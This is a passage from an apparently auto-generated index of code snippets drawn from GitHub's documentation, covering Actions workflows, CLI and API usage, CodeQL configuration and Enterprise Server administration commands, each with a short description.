store the username and email address that the GitHub App will use when making Git commits. Replace `APP_NAME` with the name of your app and `EMAIL_ADDRESS` with an appropriate email. These variables are then used to configure Git.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_41\n\nLANGUAGE: shell\nCODE:\n```\nGITHUB_APP_USER_NAME=\"APP_NAME\"\nGITHUB_APP_USER_EMAIL=\"EMAIL_ADDRESS\"\n```\n\n----------------------------------------\n\nTITLE: Disabling SSL Certificate Verification (Shell)\nDESCRIPTION: Uses the `--no-ssl-verify` option to disable SSL certificate verification when making network requests. This is generally discouraged due to security risks.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit --output-dir ./output --no-ssl-verify\n```\n\n----------------------------------------\n\nTITLE: Conditional STDOUT Print Job\nDESCRIPTION: Configures a job named `print-tag` that runs on ubuntu-latest. It includes a conditional check `if:{% raw %} ${{ inputs.print_tags }} {% endraw %}` that determines whether the job will execute based on the boolean input `print_tags`. The job includes a single step to print the tags input to STDOUT using an echo command.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflow-dispatch-inputs-example.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  print-tag:\n    runs-on: ubuntu-latest\n    if:{% raw %} ${{ inputs.print_tags }} {% endraw %}\n    steps:\n      - name: Print the input tag to STDOUT\n        run: echo {% raw %} The tags are ${{ inputs.tags }} {% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Building and Testing Code\nDESCRIPTION: This workflow demonstrates how to build and test Rust code using `cargo build` and `cargo test`. It defines a job that runs on ubuntu-latest and uses a matrix strategy to build for a specific cargo profile (release).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        BUILD_TARGET: [release] # refers to a cargo profile\n    outputs:\n      release_built: {% raw %}${{ steps.set-output.outputs.release_built }}{% endraw %}\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build binaries in \"{% raw %}${{ matrix.BUILD_TARGET }}{% endraw %}\" mode\n        run: cargo build --profile ${% raw %}{{ matrix.BUILD_TARGET }}{% endraw %}\n      - name: Run tests in \"${% raw %}{{ matrix.BUILD_TARGET }}{% endraw %}\" mode\n        run: cargo test --profile ${% raw %}{{ matrix.BUILD_TARGET }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: COBOL Main Program Code\nDESCRIPTION: This is the COBOL code for the main program that drives the account management system. It presents a menu to the user, accepts input, and calls the appropriate subprograms for various operations (view balance, credit, debit). It relies on `operations.cob` and `data.cob`.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_6\n\nLANGUAGE: COBOL\nCODE:\n```\nIDENTIFICATION DIVISION.\n       PROGRAM-ID. MainProgram.\n\n       DATA DIVISION.\n       WORKING-STORAGE SECTION.\n       01  CONTINUE-FLAG      PIC X VALUE 'Y'.\n       01  USER-CHOICE        PIC 9.\n       01  FINAL-BALANCE      PIC 9(6)V99 VALUE 1000.00.\n\n       PROCEDURE DIVISION.\n           PERFORM UNTIL CONTINUE-FLAG = 'N'\n               DISPLAY \"1. View Balance\"\n               DISPLAY \"2. Credit Account\"\n               DISPLAY \"3. Debit Account\"\n               DISPLAY \"4. Exit\"\n               ACCEPT USER-CHOICE\n\n               EVALUATE USER-CHOICE\n                   WHEN 1\n                       CALL 'Operations' USING 'TOTAL'\n                   WHEN 2\n                       CALL 'Operations' USING 'CREDIT'\n                   WHEN 3\n                       CALL 'Operations' USING 'DEBIT'\n                   WHEN 4\n                       MOVE 'N' TO CONTINUE-FLAG\n                       DISPLAY \"Exiting the program. Goodbye!\"\n                   WHEN OTHER\n                       DISPLAY \"Invalid choice. Please try again.\"\n               END-EVALUATE\n           END-PERFORM\n           STOP RUN.\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes Secret for GitHub PAT\nDESCRIPTION: This snippet creates a Kubernetes secret named 'pre-defined-secret' in the 'arc-runners' namespace, storing a GitHub personal access token (PAT) as a literal value. The 'github_token' key will hold the PAT. Replace 'YOUR-PAT' with the actual PAT value. This secret is then referenced in the `values.yaml` file for configuring the Actions Runner Controller.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nkubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_token='YOUR-PAT'\n```\n\n----------------------------------------\n\nTITLE: Querying audit log events with date and pagination\nDESCRIPTION: This cURL command retrieves audit log events for a specific date in an enterprise, using page-based pagination. It requires an authorization token and specifies the enterprise, date, page number, and items per page. The output will be a JSON response containing the audit log events, with a maximum of 100 items per page.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer TOKEN\" \\\n--request GET \\\n\"{% data variables.product.rest_url %}/enterprises/avocado-corp/audit-log?phrase=created:2022-01-01&page=1&per_page=100\"\n```\n\n----------------------------------------\n\nTITLE: CodeQL Query Pack Configuration\nDESCRIPTION: This YAML snippet shows a `qlpack.yml` file for a CodeQL query pack. It defines the pack's name, sets its version, and specifies dependencies on a library pack and a CodeQL standard library. The `dependencies` section lists other CodeQL packs this pack relies on. The `*` version constraint suggests that the workspace's version should be used.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-company/my-queries\nversion: 1.0.0\ndependencies:\n  my-company/my-library: \"*\"\n  codeql/cpp-all: ~0.2.0\n```\n\n----------------------------------------\n\nTITLE: Conditional Concurrency - Cancel Specific Branches\nDESCRIPTION: This YAML snippet configures concurrency to conditionally cancel in-progress runs based on the branch name. It uses the `contains` function to check if the ref contains `release/`. If it does not, `cancel-in-progress` is set to `true`, cancelling the current job/run. This allows to prevent cancelling release builds while still cancelling runs for other branches.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: ${{ !contains(github.ref, 'release/')}}\n```\n\n----------------------------------------\n\nTITLE: Embedding 3D Model with HTML Script Tag\nDESCRIPTION: This snippet demonstrates how to embed a 3D model hosted on GitHub into an HTML page using a script tag.  The script's `src` attribute specifies the URL of the model on GitHub, following the format: `https://embed.github.com/view/3d/<username>/<repo>/<ref>/<path_to_file>`.  Optional `height` and `width` parameters can be added to customize the rendered model's dimensions.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/working-with-non-code-files.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://embed.github.com/view/3d/<username>/<repo>/<ref>/<path_to_file>\"></script>\n```\n\n----------------------------------------\n\nTITLE: HTML CTA Button Example\nDESCRIPTION: This HTML snippet demonstrates the structure for creating a call-to-action (CTA) button. It includes placeholders for the destination URL, CTA name, and location, along with styling classes for visual appearance.  The URL should point to a {% data variables.product.company_short %}-owned domain.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n{% raw %}<a href=\"https://github.com/DESTINATION/URL?ref_cta=CTA+NAME&ref_loc=LOCATION&ref_page=docs\" target=\"_blank\" class=\"btn btn-primary mt-3 mr-3 no-underline\"><span>Try PRODUCT NAME</span> {% octicon \"link-external\" height:16 %}</a>{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Defining Languages for CodeQL Analysis in YAML\nDESCRIPTION: This YAML snippet demonstrates how to manually define the languages to be analyzed by CodeQL, overriding automatic language detection. It configures the `language` matrix within the `strategy` section of a GitHub Actions workflow to specify that only Go and JavaScript/TypeScript should be analyzed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/no-source-code-seen-during-build.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nstrategy:\n  fail-fast: false\n  matrix:\n    # Override automatic language detection by changing the list below.\n    # Supported options are listed in a comment in the default workflow.\n    language: ['go', 'javascript-typescript']\n```\n\n----------------------------------------\n\nTITLE: Finding All User Projects Node IDs (gh cli)\nDESCRIPTION: This snippet demonstrates how to find the node ID and title of all projects for a user using the GitHub CLI with a GraphQL query. Replace `USER` with the user's username. It returns the first 20 projects. Authentication with `gh auth login --scopes \"project\"` or `gh auth login --scopes \"read:project\"` is required.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\n    user(login: \"USER\") {\n      projectsV2(first: 20) {\n        nodes {\n          id\n          title\n        }\n      }\n    }\n  }'\n```\n\n----------------------------------------\n\nTITLE: Defining Experiment Configuration\nDESCRIPTION: This TypeScript code defines an experiment configuration, including the experiment key, activation status, the percentage of users to include in the experiment, language restrictions, and a flag to include the variation in the event context. The `ExperimentNames` type defines possible experiment keys.\nSOURCE: https://github.com/github/docs/blob/main/src/events/components/experiments/README.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n// Add new experiment key to this list\nexport type ExperimentNames = 'example_experiment' | 'ai_search_experiment'\n\nexport const EXPERIMENTS = {\n  example_experiment: { ... }\n  ai_search_experiment: {\n    key: 'ai_search_experiment',\n    isActive: true, // Set to false when the experiment is over\n    percentOfUsersToGetExperiment: 10, // Only 10% of users will get the experiment\n    limitToLanguages: ['en'], // Only users with the `en` language will be included in the experiment\n    includeVariationInContext: true, // See note below\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Logging in OrderService (Python)\nDESCRIPTION: This code demonstrates how to include logging statements within a service class (OrderService). It initializes a logger instance and uses it to log entry, success, error, and exit events for the `place_order` method.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nimport logging\n\nclass OrderService:\n    def __init__(self):\n        self.logger = logging.getLogger(__name__)\n\n    def place_order(self, order):\n        self.logger.info(\"Entering place_order method.\")\n        try:\n            # In here would be the business logic for placing an order\n            # ...\n            self.logger.info(\"Order placed successfully.\")\n        except Exception as e:\n            self.logger.error(f\"Error in place_order method: {e}\")\n            raise\n        finally:\n            self.logger.info(\"Exiting place_order method.\")\n```\n\n----------------------------------------\n\nTITLE: Define .NET build workflow\nDESCRIPTION: This workflow defines a CI/CD pipeline for a .NET project. It triggers on push and pull requests to the `main` branch, sets up the .NET environment, restores dependencies, builds, and tests the project.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: .NET\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Setup .NET\n      uses: {% data reusables.actions.action-setup-dotnet %}\n      with:\n        dotnet-version: 6.0.x\n    - name: Restore dependencies\n      run: dotnet restore\n    - name: Build\n      run: dotnet build --no-restore\n    - name: Test\n      run: dotnet test --no-build --verbosity normal\n```\n\n----------------------------------------\n\nTITLE: Configure GPG Key for GHE Server\nDESCRIPTION: This command configures the GPG key for web signing in GitHub Enterprise Server. It exports the secret key associated with the provided key ID, formats it, and then sets it as the value of the `secrets.gpgverify.web-signing-key` configuration option using the `ghe-config` command. The `<YOUR-KEY-ID>` placeholder should be replaced with the actual GPG key ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_site_admin_settings/pgp-key-env-variable.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nghe-config \"secrets.gpgverify.web-signing-key\" \"$(gpg --export-secret-keys -a <YOUR-KEY-ID> | awk '{printf \"%s\\\\n\", $0}')\"\n```\n\n----------------------------------------\n\nTITLE: Setting Up Octokit Client (Ruby)\nDESCRIPTION: This code snippet demonstrates how to configure the Octokit client with a personal access token for interacting with the GitHub API.  It retrieves the access token from an environment variable (`MY_PERSONAL_TOKEN`) and initializes an `Octokit::Client` instance. This client is then available for making API calls within the Sinatra application.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/building-a-ci-server.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n# Instead, set and test environment variables, like below\nACCESS_TOKEN = ENV['MY_PERSONAL_TOKEN']\n\nbefore do\n  @client ||= Octokit::Client.new(:access_token => ACCESS_TOKEN)\nend\n```\n\n----------------------------------------\n\nTITLE: Consuming Artifacts YAML\nDESCRIPTION: This YAML snippet shows how to consume artifacts produced by the `produce-artifacts` job. It retrieves the artifacts using a download action reusable and reports the color. The job depends on both `define-matrix` and `produce-artifacts` to ensure the matrix is defined and the artifacts are available.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-used-twice.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n  consume-artifacts:\n    runs-on: ubuntu-latest\n    needs:\n    - define-matrix\n    - produce-artifacts\n    strategy:\n      matrix:\n        color: {% raw %}${{ fromJSON(needs.define-matrix.outputs.colors) }}{% endraw %}\n\n    steps:\n    - name: Retrieve Artifact\n      uses: {% data reusables.actions.action-download-artifact %}\n      with:\n        name: {% raw %}${{ matrix.color }}{% endraw %}\n\n    - name: Report Color\n      run: |\n        cat color\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven and GitHub Packages Repositories in Gradle (Groovy)\nDESCRIPTION: This code snippet configures the _build.gradle_ file to include repositories for both the Maven Central Repository (through OSSRH) and GitHub Packages. It defines the repository URLs and credentials required for publishing.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_4\n\nLANGUAGE: Groovy\nCODE:\n```\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(\"MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Port and Host Variables (JavaScript)\nDESCRIPTION: This JavaScript snippet defines the `port` and `host` variables, using environment variables for deployment configurations.  If the `PORT` environment variable is set, it uses that value; otherwise, it defaults to 3000. If `NODE_ENV` is set to 'production', it uses '0.0.0.0' for the host; otherwise, it defaults to 'localhost'.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst port = process.env.PORT || 3000;\nconst host = process.env.NODE_ENV === 'production' ? '0.0.0.0' : 'localhost';\n```\n\n----------------------------------------\n\nTITLE: Disabling Dependabot Updates via SSH Shell\nDESCRIPTION: This command disables Dependabot Updates on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.dependabot.enabled` configuration option to `false`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.dependabot.enabled false\n```\n\n----------------------------------------\n\nTITLE: Example RuboCop JSON Output\nDESCRIPTION: This is an example of the JSON output generated by RuboCop when run with the `--format json` option. It shows the metadata, file paths, offenses, and a summary of the violations detected.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_36\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"metadata\": {\n    \"rubocop_version\": \"0.60.0\",\n    \"ruby_engine\": \"ruby\",\n    \"ruby_version\": \"2.3.7\",\n    \"ruby_patchlevel\": \"456\",\n    \"ruby_platform\": \"universal.x86_64-darwin18\"\n  },\n  \"files\": [\n    {\n      \"path\": \"Octocat-breeds/octocat.rb\",\n      \"offenses\": [\n        {\n          \"severity\": \"convention\",\n          \"message\": \"Style/StringLiterals: Prefer single-quoted strings when you don't need string interpolation or special symbols.\",\n          \"cop_name\": \"Style/StringLiterals\",\n          \"corrected\": false,\n          \"location\": {\n            \"start_line\": 17,\n            \"start_column\": 17,\n            \"last_line\": 17,\n            \"last_column\": 22,\n            \"length\": 6,\n            \"line\": 17,\n            \"column\": 17\n          }\n        },\n        {\n          \"severity\": \"convention\",\n          \"message\": \"Style/StringLiterals: Prefer single-quoted strings when you don't need string interpolation or special symbols.\",\n          \"cop_name\": \"Style/StringLiterals\",\n          \"corrected\": false,\n          \"location\": {\n            \"start_line\": 17,\n            \"start_column\": 25,\n            \"last_line\": 17,\n            \"last_column\": 29,\n            \"length\": 5,\n            \"line\": 17,\n            \"column\": 25\n          }\n        }\n      ]\n    }\n  ],\n  \"summary\": {\n    \"offense_count\": 2,\n    \"target_file_count\": 1,\n    \"inspected_file_count\": 1\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling linter rule on a specific line\nDESCRIPTION: This disables the specified linter rule on the current line. Replace `MD011` with the rule to disable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_11\n\nLANGUAGE: text\nCODE:\n```\n(^|/)[Cc]+odespace/ <!-- markdownlint-disable-line MD011 -->\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on approved pull request\nDESCRIPTION: This workflow triggers when a pull request review is submitted, and the 'approved' job only runs if the review state is 'approved'. It demonstrates how to use the `pull_request_review` event with the `submitted` type and the `github.event.review.state` property.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_review:\n    types: [submitted]\n\njobs:\n  approved:\n    if: github.event.review.state == 'approved'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This PR was approved\"\n```\n\n----------------------------------------\n\nTITLE: Handling Access Denied Error\nDESCRIPTION: This code snippet shows the URL parameters returned to the callback URL when a user denies access to the OAuth application. The response includes the 'access_denied' error code, a description indicating the user's denial, a URI for more information, and the state parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-authorization-request-errors.md#_snippet_2\n\nLANGUAGE: HTTP\nCODE:\n```\nhttp://your-application.com/callback?error=access_denied\n  &error_description=The+user+has+denied+your+application+access.\n  &error_uri=/apps/building-integrations/setting-up-and-registering-oauth-apps/troubleshooting-authorization-request-errors/%23access-denied\n  &state=xyz\n```\n\n----------------------------------------\n\nTITLE: Creating an Extended Support Bundle (Shell)\nDESCRIPTION: Creates an extended support bundle including data from the last 8 days using `ghe-support-bundle` with the `-x` option.  The `-o` option redirects output to STDOUT. Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_92\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -x -o' > support-bundle.tgz\n```\n\n----------------------------------------\n\nTITLE: Example `matrix` context JSON\nDESCRIPTION: This JSON snippet shows an example of the `matrix` context, which contains the matrix properties defined in the workflow file for the current job. It demonstrates how `os` and `node` values are available within the context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_18\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"os\": \"ubuntu-latest\",\n  \"node\": 16\n}\n```\n\n----------------------------------------\n\nTITLE: Example `prepare_job` Input Configuration\nDESCRIPTION: This JSON snippet showcases the structure and arguments expected for the `prepare_job` command when customizing containers in GitHub Actions self-hosted runners. It details the `jobContainer` and `services` configurations, including image details, working directory, environment variables, volume mounts, registry credentials, and port mappings.  The snippet demonstrates the data structure required to define job and service containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"command\": \"prepare_job\",\n  \"responseFile\": \"/users/octocat/runner/_work/{guid}.json\",\n  \"state\": {},\n  \"args\": {\n    \"jobContainer\": {\n      \"image\": \"node:18\",\n      \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n      \"createOptions\": \"--cpus 1\",\n      \"environmentVariables\": {\n        \"NODE_ENV\": \"development\"\n      },\n      \"userMountVolumes\": [\n        {\n          \"sourceVolumePath\": \"my_docker_volume\",\n          \"targetVolumePath\": \"/volume_mount\",\n          \"readOnly\": false\n        }\n      ],\n      \"systemMountVolumes\": [\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n          \"targetVolumePath\": \"/__w\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n          \"targetVolumePath\": \"/__e\",\n          \"readOnly\": true\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n          \"targetVolumePath\": \"/__w/_temp\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n          \"targetVolumePath\": \"/__w/_actions\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n          \"targetVolumePath\": \"/__w/_tool\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n          \"targetVolumePath\": \"/github/home\",\n          \"readOnly\": false\n        },\n        {\n          \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n          \"targetVolumePath\": \"/github/workflow\",\n          \"readOnly\": false\n        }\n      ],\n      \"registry\": {\n        \"username\": \"octocat\",\n        \"password\": \"examplePassword\",\n        \"serverUrl\": \"https://index.docker.io/v1\"\n      },\n      \"portMappings\": { \"80\": \"801\" }\n    },\n    \"services\": [\n      {\n        \"contextName\": \"redis\",\n        \"image\": \"redis\",\n        \"createOptions\": \"--cpus 1\",\n        \"environmentVariables\": {},\n        \"userMountVolumes\": [],\n        \"portMappings\": { \"80\": \"801\" },\n        \"registry\": {\n          \"username\": \"octocat\",\n          \"password\": \"examplePassword\",\n          \"serverUrl\": \"https://index.docker.io/v1\"\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SSH Host Key Fingerprint Warning\nDESCRIPTION: This code snippet represents the warning message displayed when connecting to a new SSH host.  It prompts the user to verify the host's fingerprint before continuing. The fingerprint is used to ensure that the connection is being made to the intended server and not an impostor.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n> The authenticity of host '{% data variables.product.product_url %} (IP ADDRESS)' can't be established.\n> ED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU.\n> Are you sure you want to continue connecting (yes/no)?\n```\n\n----------------------------------------\n\nTITLE: Authenticating as Management Console User with curl\nDESCRIPTION: This snippet demonstrates how to authenticate requests using a management console user's credentials. It uses `curl` to send the username and password with standard HTTP authentication to the specified hostname and administration port. Replace `YOUR_USER_NAME`, `YOUR_PASSWORD` and `ADMINISTRATION-PORT` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/manage-ghes.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L -u \"YOUR_USER_NAME:YOUR_PASSWORD\" 'http(s)://HOSTNAME:ADMINISTRATION-PORT/manage'\n```\n\n----------------------------------------\n\nTITLE: Fetching Upstream Changes\nDESCRIPTION: This snippet shows how to fetch branches and their commits from the upstream repository. It uses the `git fetch` command to retrieve updates from the upstream repository, storing them in local branches named `upstream/BRANCH-NAME`. Requires configuring a remote pointing to the upstream repo.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git fetch upstream\n> remote: Counting objects: 75, done.\n> remote: Compressing objects: 100% (53/53), done.\n> remote: Total 62 (delta 27), reused 44 (delta 9)\n> Unpacking objects: 100% (62/62), done.\n> From https://{% data variables.product.product_url %}/ORIGINAL-OWNER/ORIGINAL-REPOSITORY\n>  * [new branch]      main     -> upstream/main\n```\n\n----------------------------------------\n\nTITLE: Regenerating SAML SP Signing Certificate\nDESCRIPTION: These commands regenerate the SAML Service Provider (SP) signing certificate on a GitHub Enterprise Server instance. It backs up the old certificate, creates a new one, and restarts the `github-unicorn` service. It requires SSH access to the server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/iam-configuration-reference/saml-configuration-reference.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n# Backup the old certificate\nsudo cp /data/user/common/saml-sp.p12 /data/user/common/saml-sp.p12-$(date +%d%m%Y_%H%M%S)\n\nsaml_tempdir=$(sudo mktemp -d)\nsudo openssl req -new -newkey rsa:4096 -days 3650 -nodes -x509 -sha256 -subj \"/CN=github_enterprise\" -keyout $saml_tempdir/saml.key -out $saml_tempdir/saml.crt\nsudo openssl pkcs12 -export -inkey $saml_tempdir/saml.key -in $saml_tempdir/saml.crt -nodes -password pass: -out /data/user/common/saml-sp.p12\nsudo rm -rf $saml_tempdir\n\nsudo nomad stop github-unicorn\nsudo nomad run -hcl1 /etc/nomad-jobs/github/unicorn.hcl\n```\n\n----------------------------------------\n\nTITLE: Create Azure App Service Plan using Azure CLI\nDESCRIPTION: This command creates a new Azure App Service plan. It requires the Azure CLI to be installed and configured. Replace `MY_RESOURCE_GROUP` with an existing Azure Resource Group and `MY_APP_SERVICE_PLAN` with a desired name for the App Service plan. The `--is-linux` flag specifies a Linux-based plan.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/create-azure-app-plan.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz appservice plan create \\\n  --resource-group MY_RESOURCE_GROUP \\\n  --name MY_APP_SERVICE_PLAN \\\n  --is-linux\n```\n\n----------------------------------------\n\nTITLE: Pipenv: Configuring source in Pipfile\nDESCRIPTION: This snippet demonstrates how to configure the `[[source]]` section in the `Pipfile` to point to a private registry. This ensures that Pipenv uses the specified private registry to resolve and install dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n[[source]]\nurl = \"https://private_registry_url\"\nverify_ssl = true\nname = \"pypi\"\n```\n\n----------------------------------------\n\nTITLE: Cloning a Forked Repository using Git\nDESCRIPTION: This snippet shows how to clone a forked repository using the `git clone` command. It utilizes a URL obtained from the forked repository's main page and clones it to the local machine. The URL includes placeholders for the product URL, username, and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/USERNAME/FORK-OF-THE-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: MIT License Attribution Example - Markdown\nDESCRIPTION: This markdown snippet demonstrates the correct format for attributing MIT-licensed content in GitHub documentation. It includes a header titled \"Legal notice\", a statement of attribution, a link to the project, and the full text of the MIT license within a code block.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_17\n\nLANGUAGE: markdown\nCODE:\n```\n## Legal notice\n\nPortions have been adapted from [PROJECT](/LINK/TO/PROJECT) under the MIT license:\n\n```\nMIT License\n\nCopyright YEAR COPYRIGHT-HOLDER\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in 